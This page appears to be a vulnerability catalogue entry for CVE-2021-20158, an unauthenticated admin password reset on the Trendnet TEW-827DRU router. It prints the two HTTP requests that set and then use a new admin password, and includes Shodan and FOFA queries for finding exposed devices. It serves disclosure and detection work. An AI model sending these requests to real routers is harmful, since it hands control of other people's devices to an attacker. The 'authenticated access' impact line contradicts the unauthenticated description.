---
layout: "post"
cve_id: "CVE-2021-20158"
title: "Trendnet AC2600 TEW-827DRU 2.08B01 - Admin Password Change"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-20158.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20158.yaml"
author: "gy741"
severity: "critical"
impact: "An attacker with authenticated access can gain unauthorized control over the affected device.
"
remediation: "Upgrade to the latest firmware version provided by Trendnet to fix the vulnerability.
"
reference:
  - "https://www.tenable.com/security/research/tra-2021-54"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-20150"
  - "https://github.com/ARPSyndicate/cvemon"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2021-20158', 'cwe-id': 'CWE-306', 'epss-score': 0.8034, 'epss-percentile': 0.99082, 'cpe': 'cpe:2.3:o:trendnet:tew-827dru_firmware:2.08b01:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'trendnet', 'product': 'tew-827dru_firmware', 'shodan-query': ['http.html:"TEW-827DRU"', 'http.html:"tew-827dru"'], 'fofa-query': 'body="tew-827dru"'}"
tags:
  - "cve2021"
  - "cve"
  - "disclosure"
  - "router"
  - "intrusive"
  - "tenable"
  - "trendnet"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Trendnet AC2600 TEW-827DRU version 2.08B01 contains an authentication bypass vulnerability. It is possible for an unauthenticated, malicious actor to force change the admin password due to a hidden administrative command.

## üåê HTTP Request
```nohighlight
POST /apply_sec.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; es-es) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13
Connection: close
Content-Length: 143
Accept-Encoding: gzip

ccp_act=set&action=tools_admin_elecom&html_response_page=dummy_value&html_response_return_page=dummy_value&method=tools&admin_password=RovvQI5Q
```

```nohighlight
POST /apply_sec.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Connection: close
Content-Length: 152
Accept-Encoding: gzip

html_response_page=%2Flogin_pic.asp&login_name=YWRtaW4%3D&log_pass=Um92dlFJNVE=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=
```

